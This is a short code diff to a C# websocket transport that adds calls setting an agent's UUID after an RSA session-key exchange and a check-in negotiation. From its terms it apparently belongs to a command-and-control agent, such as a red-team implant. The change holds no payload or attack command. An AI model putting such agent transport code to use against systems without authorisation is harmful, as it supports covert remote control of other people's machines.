@@ -394,6 +394,7 @@ namespace WebsocketTransport
                             byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                             ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                             ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
+                            Agent.SetUUID(respHandshake.UUID);
                             _keyExchanged = true;
                             return true;
                         }))
@@ -412,6 +413,7 @@ namespace WebsocketTransport
                         {
                             _uuidNegotiated = true;
                             ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                            Agent.SetUUID(mResp.ID);
                             checkinMsg.UUID = mResp.ID;
                         }
                         Connected = true;
